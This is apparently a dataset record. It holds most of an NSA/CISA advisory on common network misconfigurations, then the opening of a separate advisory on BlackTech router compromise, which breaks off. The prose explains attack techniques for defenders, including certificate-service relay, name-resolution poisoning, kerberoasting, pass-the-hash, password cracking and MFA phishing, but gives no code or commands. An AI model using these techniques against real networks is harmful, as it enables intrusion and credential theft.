In addition to devices that provide network access, printers, scanners, security cameras, conference room audiovisual (AV) equipment, voice over internet protocol (VoIP) phones, and internet of things (IoT) devices commonly contain default credentials that can be used for easy unauthorized access to these devices as well. Further compounding this problem, printers and scanners may have privileged domain accounts loaded so that users can easily scan documents and upload them to a shared drive or email them. Malicious actors who gain access to a printer or scanner using default credentials can use the loaded privileged domain accounts to move laterally from the device and compromise the domain,.
Default Service Permissions and Configuration Settings
Certain services may have overly permissive access controls or vulnerable configurations by default. Additionally, even if the providers do not enable these services by default, malicious actors can easily abuse these services if users or administrators enable them.
Assessment teams regularly find the following:

Insecure Active Directory Certificate Services
Insecure legacy protocols/services
Insecure Server Message Block (SMB) service

Insecure Active Directory Certificate Services
Active Directory Certificate Services (ADCS) is a feature used to manage Public Key Infrastructure (PKI) certificates, keys, and encryption inside of Active Directory (AD) environments. ADCS templates are used to build certificates for different types of servers and other entities on an organization’s network.
Malicious actors can exploit ADCS and/or ADCS template misconfigurations to manipulate the certificate infrastructure into issuing fraudulent certificates and/or escalate user privileges to domain administrator privileges. These certificates and domain escalation paths may grant actors unauthorized, persistent access to systems and critical data, the ability to impersonate legitimate entities, and the ability to bypass security measures.
Assessment teams have observed organizations with the following misconfigurations:

ADCS servers running with web-enrollment enabled. If web-enrollment is enabled, unauthenticated actors can coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to the ADCS web-enrollment service and obtain a certificate, for the server’s account. These fraudulent, trusted certificates enable actors to use adversary-in-the-middle techniques, to masquerade as trusted entities on the network. The actors can also use the certificate for AD authentication to obtain a Kerberos Ticket Granting Ticket (TGT), which they can use to compromise the server and usually the entire domain.
ADCS templates where low-privileged users have enrollment rights, and the enrollee supplies a subject alternative name. Misconfiguring various elements of ADCS templates can result in domain escalation by unauthorized users (e.g., granting low-privileged users certificate enrollment rights, allowing requesters to specify a subjectAltName in the certificate signing request,CSR, not requiring authorized signatures for CSRs, granting FullControl or WriteDacl permissions to users). Malicious actors can use a low-privileged user account to request a certificate with a particular Subject Alternative Name (SAN) and gain a certificate where the SAN matches the User Principal Name (UPN) of a privileged account.

Note: For more information on known escalation paths, including PetitPotam NTLM relay techniques, see: Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints and Certified Pre-Owned, Active Directory Certificate Services.,10,11,12,
Insecure legacy protocols/services
Many vulnerable network services are enabled by default, and assessment teams have observed them enabled in production environments. Specifically, assessment teams have observed Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS), which are Microsoft Windows components that serve as alternate methods of host identification. If these services are enabled in a network, actors can use spoofing, poisoning, and relay techniques, to obtain domain hashes, system access, and potential administrative system sessions. Malicious actors frequently exploit these protocols to compromise entire Windows’ environments.
Malicious actors can spoof an authoritative source for name resolution on a target network by responding to passing traffic, effectively poisoning the service so that target computers will communicate with an actor-controlled system instead of the intended one. If the requested system requires identification/authentication, the target computer will send the user’s username and hash to the actor-controlled system. The actors then collect the hash and crack it offline to obtain the plain text password,.
Insecure Server Message Block (SMB) service
The Server Message Block service is a Windows component primarily for file sharing. Its default configuration, including in the latest version of Windows, does not require signing network messages to ensure authenticity and integrity. If SMB servers do not enforce SMB signing, malicious actors can use machine-in-the-middle techniques, such as NTLM relay. Further, malicious actors can combine a lack of SMB signing with the name resolution poisoning issue (see above) to gain access to remote systems, without needing to capture and crack any hashes.
2. Improper Separation of User/Administrator Privilege
Administrators often assign multiple roles to one account. These accounts have access to a wide range of devices and services, allowing malicious actors to move through a network quickly with one compromised account without triggering lateral movement and/or privilege escalation detection measures.
Assessment teams have observed the following common account separation misconfigurations:

Excessive account privileges
Elevated service account permissions
Non-essential use of elevated accounts

Excessive Account Privileges
Account privileges are intended to control user access to host or application resources to limit access to sensitive information or enforce a least-privilege security model. When account privileges are overly permissive, users can see and/or do things they should not be able to, which becomes a security issue as it increases risk exposure and attack surface.
Expanding organizations can undergo numerous changes in account management, personnel, and access requirements. These changes commonly lead to privilege creep—the granting of excessive access and unnecessary account privileges. Through the analysis of topical and nested AD groups, a malicious actor can find a user account, that has been granted account privileges that exceed their need-to-know or least-privilege function. Extraneous access can lead to easy avenues for unauthorized access to data and resources and escalation of privileges in the targeted domain.
Elevated Service Account Permissions
Applications often operate using user accounts to access resources. These user accounts, which are known as service accounts, often require elevated privileges. When a malicious actor compromises an application or service using a service account, they will have the same privileges and access as the service account.
Malicious actors can exploit elevated service permissions within a domain to gain unauthorized access and control over critical systems. Service accounts are enticing targets for malicious actors because such accounts are often granted elevated permissions within the domain due to the nature of the service, and because access to use the service can be requested by any valid domain user. Due to these factors, kerberoasting—a form of credential access achieved by cracking service account credentials—is a common technique used to gain control over service account targets,.
Non-Essential Use of Elevated Accounts
IT personnel use domain administrator and other administrator accounts for system and network management due to their inherent elevated privileges. When an administrator account is logged into a compromised host, a malicious actor can steal and use the account's credentials and an AD-generated authentication token, to move, using the elevated permissions, throughout the domain,. Using an elevated account for normal day-to-day, non-administrative tasks increases the account’s exposure and, therefore, its risk of compromise and its risk to the network.
Malicious actors prioritize obtaining valid domain credentials upon gaining access to a network. Authentication using valid domain credentials allows the execution of secondary enumeration techniques to gain visibility into the target domain and AD structure, including discovery of elevated accounts and where the elevated accounts are used,.
Targeting elevated accounts (such as domain administrator or system administrators) performing day-to-day activities provides the most direct path to achieve domain escalation. Systems or applications accessed by the targeted elevated accounts significantly increase the attack surface available to adversaries, providing additional paths and escalation options.
After obtaining initial access via an account with administrative permissions, an assessment team compromised a domain in under a business day. The team first gained initial access to the system through phishing, by which they enticed the end user to download, and execute malicious payloads. The targeted end-user account had administrative permissions, enabling the team to quickly compromise the entire domain.
3. Insufficient Internal Network Monitoring
Some organizations do not optimally configure host and network sensors for traffic collection and end-host logging. These insufficient configurations could lead to undetected adversarial compromise. Additionally, improper sensor configurations limit the traffic collection capability needed for enhanced baseline development and detract from timely detection of anomalous activity.
Assessment teams have exploited insufficient monitoring to gain access to assessed networks. For example:

An assessment team observed an organization with host-based monitoring, but no network monitoring. Host-based monitoring informs defensive teams about adverse activities on singular hosts and network monitoring informs about adverse activities traversing hosts,. In this example, the organization could identify infected hosts but could not identify where the infection was coming from, and thus could not stop future lateral movement and infections.
An assessment team gained persistent deep access to a large organization with a mature cyber posture. The organization did not detect the assessment team’s lateral movement, persistence, and command and control (C2) activity, including when the team attempted noisy activities to trigger a security response. For more information on this activity, see CSA CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks.,13,

4. Lack of Network Segmentation
Network segmentation separates portions of the network with security boundaries. Lack of network segmentation leaves no security boundaries between the user, production, and critical system networks. Insufficient network segmentation allows an actor who has compromised a resource on the network to move laterally across a variety of systems uncontested. Lack of network segregation additionally leaves organizations significantly more vulnerable to potential ransomware attacks and post-exploitation techniques.
Lack of segmentation between IT and operational technology (OT) environments places OT environments at risk. For example, assessment teams have often gained access to OT networks—despite prior assurance that the networks were fully air gapped, with no possible connection to the IT network—by finding special purpose, forgotten, or even accidental network connections,.
5. Poor Patch Management
Vendors release patches and updates to address security vulnerabilities. Poor patch management and network hygiene practices often enable adversaries to discover open attack vectors and exploit critical vulnerabilities. Poor patch management includes:

Lack of regular patching
Use of unsupported operating systems (OSs) and outdated firmware

Lack of Regular Patching
Failure to apply the latest patches can leave a system open to compromise from publicly available exploits. Due to their ease of discovery—via vulnerability scanning, and open source research,—and exploitation, these systems are immediate targets for adversaries. Allowing critical vulnerabilities to remain on production systems without applying their corresponding patches significantly increases the attack surface. Organizations should prioritize patching known exploited vulnerabilities in their environments.,2,
Assessment teams have observed threat actors exploiting many CVEs in public-facing applications, including:

CVE-2019-18935 in an unpatched instance of Telerik® UI for ASP.NET running on a Microsoft IIS server.,14,
CVE-2021-44228 (Log4Shell) in an unpatched VMware® Horizon server.,15,
CVE-2022-24682, CVE-2022-27924, and CVE-2022-27925 chained with CVE-2022-37042, or CVE-2022-30333 in an unpatched Zimbra® Collaboration Suite.,16,

Use of Unsupported OSs and Outdated Firmware
Using software or hardware that is no longer supported by the vendor poses a significant security risk because new and existing vulnerabilities are no longer patched. Malicious actors can exploit vulnerabilities in these systems to gain unauthorized access, compromise sensitive data, and disrupt operations,.
Assessment teams frequently observe organizations using unsupported Windows operating systems without updates MS17-010 and MS08-67. These updates, released years ago, address critical remote code execution vulnerabilities.,17,18,
6. Bypass of System Access Controls
A malicious actor can bypass system access controls by compromising alternate authentication methods in an environment. If a malicious actor can collect hashes in a network, they can use the hashes to authenticate using non-standard means, such as pass-the-hash (PtH),. By mimicking accounts without the clear-text password, an actor can expand and fortify their access without detection. Kerberoasting is also one of the most time-efficient ways to elevate privileges and move laterally throughout an organization’s network.
7. Weak or Misconfigured MFA Methods
Misconfigured Smart Cards or Tokens
Some networks (generally government or DoD networks) require accounts to use smart cards or tokens. Multifactor requirements can be misconfigured so the password hashes for accounts never change. Even though the password itself is no longer used—because the smart card or token is required instead—there is still a password hash for the account that can be used as an alternative credential for authentication. If the password hash never changes, once a malicious actor has an account’s password hash, the actor can use it indefinitely, via the PtH technique for as long as that account exists.
Lack of Phishing-Resistant MFA
Some forms of MFA are vulnerable to phishing, “push bombing”, exploitation of Signaling System 7 (SS7) protocol vulnerabilities, and/or “SIM swap” techniques. These attempts, if successful, may allow a threat actor to gain access to MFA authentication credentials or bypass MFA and access the MFA-protected systems. (See CISA’s Fact Sheet Implementing Phishing-Resistant MFA for more information.),3,
For example, assessment teams have used voice phishing to convince users to provide missing MFA information,. In one instance, an assessment team knew a user’s main credentials, but their login attempts were blocked by MFA requirements. The team then masqueraded as IT staff and convinced the user to provide the MFA code over the phone, allowing the team to complete their login attempt and gain access to the user’s email and other organizational resources.
8. Insufficient ACLs on Network Shares and Services
Data shares and repositories are primary targets for malicious actors. Network administrators may improperly configure ACLs to allow for unauthorized users to access sensitive or administrative data on shared drives.
Actors can use commands, open source tools, or custom malware to look for shared folders and drives,.

In one compromise, a team observed actors use the net share command—which displays information about shared resources on the local computer—and the ntfsinfo command to search network shares on compromised computers. In the same compromise, the actors used a custom tool, CovalentStealer, which is designed to identify file shares on a system, categorize the files, and upload the files to a remote server,.,19,20,
Ransomware actors have used the SoftPerfect® Network Scanner, netscan.exe—which can ping computers, scan ports, and discover shared folders—and SharpShares to enumerate accessible network shares in a domain.,21,22,

Malicious actors can then collect and exfiltrate the data from the shared drives and folders. They can then use the data for a variety of purposes, such as extortion of the organization or as intelligence when formulating intrusion plans for further network compromise. Assessment teams routinely find sensitive information on network shares, that could facilitate follow-on activity or provide opportunities for extortion. Teams regularly find drives containing cleartext credentials, for service accounts, web applications, and even domain administrators.
Even when further access is not directly obtained from credentials in file shares, there can be a treasure trove of information for improving situational awareness of the target network, including the network’s topology, service tickets, or vulnerability scan data. In addition, teams regularly identify sensitive data and PII on shared drives (e.g., scanned documents, social security numbers, and tax returns) that could be used for extortion or social engineering of the organization or individuals.
9. Poor Credential Hygiene
Poor credential hygiene facilitates threat actors in obtaining credentials for initial access, persistence, lateral movement, and other follow-on activity, especially if phishing-resistant MFA is not enabled. Poor credential hygiene includes:

Easily crackable passwords
Cleartext password disclosure

Easily Crackable Passwords
Easily crackable passwords are passwords that a malicious actor can guess within a short time using relatively inexpensive computing resources. The presence of easily crackable passwords on a network generally stems from a lack of password length (i.e., shorter than 15 characters) and randomness (i.e., is not unique or can be guessed). This is often due to lax requirements for passwords in organizational policies and user training. A policy that only requires short and simple passwords leaves user passwords susceptible to password cracking. Organizations should provide or allow employee use of password managers to enable the generation and easy use of secure, random passwords for each account.
Often, when a credential is obtained, it is a hash (one-way encryption) of the password and not the password itself. Although some hashes can be used directly with PtH techniques, many hashes need to be cracked to obtain usable credentials. The cracking process takes the captured hash of the user’s plaintext password and leverages dictionary wordlists and rulesets, often using a database of billions of previously compromised passwords, in an attempt to find the matching plaintext password,.
One of the primary ways to crack passwords is with the open source tool, Hashcat, combined with password lists obtained from publicly released password breaches. Once a malicious actor has access to a plaintext password, they are usually limited only by the account’s permissions. In some cases, the actor may be restricted or detected by advanced defense-in-depth and zero trust implementations as well, but this has been a rare finding in assessments thus far.
Assessment teams have cracked password hashes for NTLM users, Kerberos service account tickets, NetNTLMv2, and PFX stores, enabling the team to elevate privileges and move laterally within networks. In 12 hours, one team cracked over 80% of all users' passwords in an Active Directory, resulting in hundreds of valid credentials.
Cleartext Password Disclosure
Storing passwords in cleartext is a serious security risk. A malicious actor with access to files containing cleartext passwords, could use these credentials to log into the affected applications or systems under the guise of a legitimate user. Accountability is lost in this situation as any system logs would record valid user accounts accessing applications or systems.
Malicious actors search for text files, spreadsheets, documents, and configuration files in hopes of obtaining cleartext passwords. Assessment teams frequently discover cleartext passwords, allowing them to quickly escalate the emulated intrusion from the compromise of a regular domain user account to that of a privileged account, such as a Domain or Enterprise Administrator. A common tool used for locating cleartext passwords is the open source tool, Snaffler.,23,
10. Unrestricted Code Execution
If unverified programs are allowed to execute on hosts, a threat actor can run arbitrary, malicious payloads within a network.
Malicious actors often execute code after gaining initial access to a system. For example, after a user falls for a phishing scam, the actor usually convinces the victim to run code on their workstation to gain remote access to the internal network. This code is usually an unverified program that has no legitimate purpose or business reason for running on the network.
Assessment teams and malicious actors frequently leverage unrestricted code execution in the form of executables, dynamic link libraries (DLLs), HTML applications, and macros (scripts used in office automation documents), to establish initial access, persistence, and lateral movement. In addition, actors often use scripting languages, to obscure their actions, and bypass allowlisting—where organizations restrict applications and other forms of code by default and only allow those that are known and trusted. Further, actors may load vulnerable drivers and then exploit the drivers’ known vulnerabilities to execute code in the kernel with the highest level of system privileges to completely compromise the device,.
MITIGATIONS
Network Defenders
NSA and CISA recommend network defenders implement the recommendations that follow to mitigate the issues identified in this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST) as well as with the MITRE ATT&CK Enterprise Mitigations and MITRE D3FEND frameworks.
The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.,24,
Mitigate Default Configurations of Software and Applications

Mitigate Improper Separation of User/Administrator Privilege

Mitigate Insufficient Internal Network Monitoring

Mitigate Lack of Network Segmentation

Mitigate Poor Patch Management

Mitigate Bypass of System Access Controls

Mitigate Weak or Misconfigured MFA Methods

Mitigate Insufficient ACLs on Network Shares and Services

Mitigate Poor Credential Hygiene

Mitigate Unrestricted Code Execution

Software Manufacturers
NSA and CISA recommend software manufacturers implement the recommendations in Table 11 to reduce the prevalence of misconfigurations identified in this advisory. These mitigations align with tactics provided in joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-by-Design and -Default. NSA and CISA strongly encourage software manufacturers apply these recommendations to ensure their products are secure “out of the box” and do not require customers to spend additional resources making configuration changes, performing monitoring, and conducting routine updates to keep their systems secure.,1,

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, NSA and CISA recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. NSA and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 12–Table 21).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and NSA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
LEARN FROM HISTORY
The misconfigurations described above are all too common in assessments and the techniques listed are standard ones leveraged by multiple malicious actors, resulting in numerous real network compromises. Learn from the weaknesses of others and implement the mitigations above properly to protect the network, its sensitive information, and critical missions.
WORKS CITED,1,   Joint Guide: Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-by-Design and -Default (2023), https://www.cisa.gov/sites/default/files/2023-06/principles_approaches_for_security-by-design-default_508c.pdf,2,   CISA, Known Exploited Vulnerabilities Catalog, https://www.cisa.gov/known-exploited-vulnerabilities-catalog,3,   CISA, Implementing Phishing-Resistant MFA, https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf,4,   MITRE, ATT&CK for Enterprise, https://attack.mitre.org/versions/v13/matrices/enterprise/,5,   MITRE, D3FEND, https://d3fend.mitre.org/,6,   CISA, Best Practices for MITRE ATT&CK Mapping, https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping,7,   CISA, Decider Tool, https://github.com/cisagov/Decider/,8,   CISA, Cyber Assessment Fact Sheet, https://www.cisa.gov/sites/default/files/publications/VM_Assessments_Fact_Sheet_RVA_508C.pdf,9,   Joint CSA: Weak Security Controls and Practices Routinely Exploited for Initial Access, https://media.defense.gov/2022/May/17/2002998718/-1/-1/0/CSA_WEAK_SECURITY_CONTROLS_PRACTICES_EXPLOITED_FOR_INITIAL_ACCESS.PDF,10,  Microsoft KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS), https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429,11,  Raj Chandel, Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints, https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/,12,  SpecterOps - Will Schroeder, Certified Pre-Owned, https://posts.specterops.io/certified-pre-owned-d95910965cd2,13,  CISA, CSA: CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-059a,14,  Joint CSA: Threat Actors Exploit Progress Telerik Vulnerabilities in Multiple U.S. Government IIS Servers, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a,15,  Joint CSA: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester, https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a,16,  Joint CSA: Threat Actors Exploiting Multiple CVEs Against Zimbra Collaboration Suite, https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-228a,17,  Microsoft, How to verify that MS17-010 is installed, https://support.microsoft.com/en-us/topic/how-to-verify-that-ms17-010-is-installed-f55d3f13-7a9c-688c-260b-477d0ec9f2c8,18,  Microsoft, Microsoft Security Bulletin MS08-067 – Critical Vulnerability in Server Service Could Allow Remote Code Execution (958644), https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067,19,  Joint CSA: Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization, https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-277a,20,  CISA, Malware Analysis Report: 10365227.r1.v1, https://www.cisa.gov/sites/default/files/2023-06/mar-10365227.r1.v1.clear_.pdf,21,  Joint CSA: #StopRansomware: BianLian Ransomware Group, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a,22,  CISA Analysis Report: FiveHands Ransomware, https://www.cisa.gov/news-events/analysis-reports/ar21-126a,23,  Snaffler, https://github.com/SnaffCon/Snaffler,24,  CISA, Cross-Sector Cybersecurity Performance Goals, https://www.cisa.gov/cross-sector-cybersecurity-performance-goals,25,  Defense Information Systems Agency (DISA), Security Technical Implementation Guides (STIGs), https://public.cyber.mil/stigs/,26,  NSA, Network Infrastructure Security Guide, https://media.defense.gov/2022/Jun/15/2003018261/-1/-1/0/CTR_NSA_NETWORK_INFRASTRUCTURE_SECURITY_GUIDE_20220615.PDF,27,  NSA, Actively Manage Systems and Configurations, https://media.defense.gov/2019/Sep/09/2002180326/-1/-1/0/Actively%20Manage%20Systems%20and%20Configurations.docx%20-%20Copy.pdf,28,  NSA, Cybersecurity Advisories & Guidance, https://www.nsa.gov/cybersecurity-guidance,29,  National Institute of Standards and Technologies (NIST), NIST SP 800-63B: Digital Identity Guidelines: Authentication and Lifecycle Management, https://csrc.nist.gov/pubs/sp/800/63/b/upd2/final,30,  Microsoft, Uninstall-AdcsWebEnrollment, https://learn.microsoft.com/en-us/powershell/module/adcsdeployment/uninstall-adcswebenrollment,31,  Microsoft, KB5021989: Extended Protection for Authentication, https://support.microsoft.com/en-au/topic/kb5021989-extended-protection-for-authentication-1b6ea84d-377b-4677-a0b8-af74efbb243f,32,  Microsoft, Network security: Restrict NTLM: NTLM authentication in this domain, https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain,33,  Microsoft, Network security: Restrict NTLM: Incoming NTLM traffic, https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic,34,  Microsoft, How to disable the Subject Alternative Name for UPN mapping, https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/disable-subject-alternative-name-upn-mapping,35,  Microsoft, Overview of Server Message Block signing, https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing,36,  Microsoft, SMB signing required by default in Windows Insider, https://aka.ms/SmbSigningRequired,37,  NSA, Defend Privileges and Accounts, https://media.defense.gov/2019/Sep/09/2002180330/-1/-1/0/Defend%20Privileges%20and%20Accounts%20-%20Copy.pdf,38,  NSA, Advancing Zero Trust Maturity Throughout the User Pillar, https://media.defense.gov/2023/Mar/14/2003178390/-1/-1/0/CSI_Zero_Trust_User_Pillar_v1.1.PDF,39,  NSA, Continuously Hunt for Network Intrusions, https://media.defense.gov/2019/Sep/09/2002180360/-1/-1/0/Continuously%20Hunt%20for%20Network%20Intrusions%20-%20Copy.pdf,40,  Joint CSI: Detect and Prevent Web Shell Malware, https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF,41,  NSA, Segment Networks and Deploy Application-aware Defenses, https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf,42,  Joint CSA: NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, https://media.defense.gov/2020/Jul/23/2002462846/-1/-1/0/OT_ADVISORY-DUAL-OFFICIAL-20200722.PDF,43,  NSA, Stop Malicious Cyber Activity Against Connected Operational Technology, https://media.defense.gov/2021/Apr/29/2002630479/-1/-1/0/CSA_STOP-MCA-AGAINST-OT_UOO13672321.PDF,44,  NSA, Performing Out-of-Band Network Management, https://media.defense.gov/2020/Sep/17/2002499616/-1/-1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PDF,45,  NSA, Update and Upgrade Software Immediately, https://media.defense.gov/2019/Sep/09/2002180319/-1/-1/0/Update%20and%20Upgrade%20Software%20Immediately.docx%20-%20Copy.pdf,46,  Microsoft, Microsoft Security Advisory 2871997: Update to Improve Credentials Protection and Management, https://learn.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997,47,  CISA, Secure Cloud Business Applications Hybrid Identity Solutions Architecture, https://www.cisa.gov/sites/default/files/2023-03/csso-scuba-guidance_document-hybrid_identity_solutions_architecture-2023.03.22-final.pdf,48,  CISA, Secure Cloud Business Applications (SCuBA) Project, https://www.cisa.gov/resources-tools/services/secure-cloud-business-applications-scuba-project,49,  NSA, Transition to Multi-factor Authentication, https://media.defense.gov/2019/Sep/09/2002180346/-1/-1/0/Transition%20to%20Multi-factor%20Authentication%20-%20Copy.pdf,50,  Committee on National Security Systems (CNSS), CNSS Policy 15, https://www.cnss.gov/CNSS/issuances/Policies.cfm,51,  NSA, NSA Releases Future Quantum-Resistant (QR) Algorithm Requirements for National Security Systems, https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/3148990/nsa-releases-future-quantum-resistant-qr-algorithm-requirements-for-national-se/,52,  NSA, Enforce Signed Software Execution Policies, https://media.defense.gov/2019/Sep/09/2002180334/-1/-1/0/Enforce%20Signed%20Software%20Execution%20Policies%20-%20Copy.pdf,53,  Joint CSI: Keeping PowerShell: Security Measures to Use and Embrace, https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF,54,  NIST, NIST SP 800-218: Secure Software Development Framework (SSDF) Version 1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities, https://csrc.nist.gov/publications/detail/sp/800-218/final
Disclaimer of Endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Trademarks
Active Directory, Microsoft, and Windows are registered trademarks of Microsoft Corporation.MITRE ATT&CK is registered trademark and MITRE D3FEND is a trademark of The MITRE Corporation.SoftPerfect is a registered trademark of SoftPerfect Proprietary Limited Company.Telerik is a registered trademark of Progress Software Corporation.VMware is a registered trademark of VMWare, Inc.Zimbra is a registered trademark of Synacor, Inc.
Purpose
This document was developed in furtherance of the authoring cybersecurity organizations’ missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Contact
Cybersecurity Report Feedback: CybersecurityReports@nsa.govGeneral Cybersecurity Inquiries: Cybersecurity_Requests@nsa.gov Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.govMedia Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov 
Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472). When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
Appendix: MITRE ATT&CK Tactics and Techniques
See Table 12–Table 21 for all referenced threat actor tactics and techniques in this advisory.
















This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a
17,"



Executive Summary
The United States National Security Agency (NSA), the U.S. Federal Bureau of Investigation (FBI), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the Japan National Police Agency (NPA), and the Japan National Center of Incident Readiness and Strategy for Cybersecurity (NISC) (hereafter referred to as the “authoring agencies”) are releasing this joint cybersecurity advisory (CSA) to detail activity of the People’s Republic of China (PRC)-linked cyber actors known as BlackTech. BlackTech has demonstrated capabilities in modifying router firmware without detection and exploiting routers’ domain-trust relationships for pivoting from international subsidiaries to headquarters in Japan and the U.S. — the primary targets. The authoring agencies recommend implementing the mitigations described to detect this activity and protect devices from the backdoors the BlackTech actors are leaving behind.
BlackTech (a.k.a. Palmerworm, Temp.Overboard, Circuit Panda, and Radio Panda) actors have targeted government, industrial, technology, media, electronics, and telecommunication sectors, including entities that support the militaries of the U.S. and Japan. BlackTech actors use custom malware, dual-use tools, and living off the land tactics, such as disabling logging on routers, to conceal their operations. This CSA details BlackTech’s tactics, techniques, and procedures (TTPs), which highlights the need for multinational corporations to review all subsidiary connections, verify access, and consider implementing Zero Trust models to limit the extent of a potential BlackTech compromise.
For more information on the risks posed by this deep level of unauthorized access, see the CSA People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices.[1]
Download the PDF version of this report: PDF, 808 KB
Technical Details
This advisory uses the MITRE® ATT&CK® for Enterprise framework, version 13.1. See the Appendix: MITRE ATT&CK Techniques for all referenced TTPs.
Background
Active since 2010, BlackTech actors have historically targeted a wide range of U.S. and East Asia public organizations and private industries. BlackTech actors’ TTPs include developing customized malware and tailored persistence mechanisms for compromising routers. These TTPs allow the actors to disable logging [T1562] and abuse trusted domain relationships [T1199] to pivot between international subsidiaries and domestic headquarters’ networks.
Observable TTPs
BlackTech cyber actors use custom malware payloads and remote access tools (RATs) to target victims’ operating systems. The actors have used a range of custom malware families targeting Windows®, Linux®, and FreeBSD® operating systems. Custom malware families employed by BlackTech include:

BendyBear [S0574]
Bifrose
BTSDoor
FakeDead (a.k.a. TSCookie) [S0436]
Flagpro [S0696]
FrontShell (FakeDead’s downloader module)
IconDown
PLEAD [S0435]
SpiderPig
SpiderSpring
SpiderStack
WaterBear [S0579]

BlackTech actors continuously update these tools to evade detection [TA0005] by security software. The actors also use stolen code-signing certificates [T1588.003] to sign the malicious payloads, which make them appear legitimate and therefore more difficult for security software to detect [T1553.002].
BlackTech actors use living off the land TTPs to blend in with normal operating system and network activities, allowing them to evade detection by endpoint detection and response (EDR) products. Common methods of persistence on a host include NetCat shells, modifying the victim registry [T1112] to enable the remote desktop protocol (RDP) [T1021.001], and secure shell (SSH) [T1021.004]. The actors have also used SNScan for enumeration [TA0007], and a local file transfer protocol (FTP) server [T1071.002] to move data through the victim network. For additional examples of malicious cyber actors living off the land, see People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.[2]
Pivoting from international subsidiaries
The PRC-linked BlackTech actors target international subsidiaries of U.S. and Japanese companies. After gaining access [TA0001] to the subsidiaries’ internal networks, BlackTech actors are able to pivot from the trusted internal routers to other subsidiaries of the companies and the headquarters’ networks. BlackTech actors exploit trusted network relationships between an established victim and other entities to expand their access in target networks.
